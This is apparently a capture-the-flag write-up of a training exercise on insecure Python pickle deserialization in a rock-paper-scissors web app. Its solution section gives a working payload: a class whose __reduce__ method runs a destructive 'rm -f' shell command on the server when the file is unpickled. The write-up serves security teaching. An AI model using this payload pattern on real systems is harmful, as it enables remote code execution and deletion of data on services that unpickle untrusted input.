---
title: "Dangerous Pickle loading"
layout: page
---

- Web Security
- Insecure Deserilaization
- Python

Writeup by `Sasszem`

# Description and resources
## Mission brief
Here is an overly simplified example of insecure deserialization: an awesome web application is given that has a single purpose: it plays rock-paper-scissors games with bots.
Let us show you why is it a bad idea to blindly deserialize user-submitted input. This is a (hopefully) uncommon, but devastating vulnerability.

## Instructions
You can fight against the built-in AI using existing bots or you can configure your own. These bots could be complex and well-trained AIs in real life, but these simple bots only contain few integers and they'll determine the weight of different choices.

Feel free to fine-tune the weights (but don't touch anything else) and if you're ready please upload your solution. Your bot object will be serialized, uploaded to the server as `custom.p` (you can find it in the `Downloads` section), and finally deserialized by the web application.

In case you didn't already know, deserialization could be really dangerous since you basically execute the serialized code. This means deserializing user-submitted objects basically equals Remote Code Execution.

I have prepared a simple exploit that should result in crashing the whole application by deleting an HTML template.

In Python, the `pickle` module lets you serialize and deserialize data.

## Your task
Here is a snippet from the backend:

```python
pickle.load(open("bots/" + player_bot + ".p", "rb"))
```

Your task is to delete a template file located at /srv/webservice/templates/match.html.

## Recommended readings
[Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

---

# Solution

It was rather easy. I googled "pickle rce", and found [this template](https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd). I re-used that class and modded it to do the deletion.

Then I started the exercise (time matters too, I prepared all I could), and a download for a custom bot (.py file) showed up:

```python
class Player:
    def __init__(self):
        self.rock = 1		# Probability weight of picking rock
        self.paper = 1		# Probability weight of picking paper
        self.scissors = 1	# Probability weight of picking scissors
```

So I quickly merged it with my prepared class:
```python

class Player:
    def __init__(self):
        self.rock = 1		# Probability weight of picking rock
        self.paper = 1		# Probability weight of picking paper
        self.scissors = 1	# Probability weight of picking scissors
    def __reduce__(self):
        import os
        return (os.system,("rm -f /srv/webservice/templates/match.html",))

```
Uploaded that, and got the points.

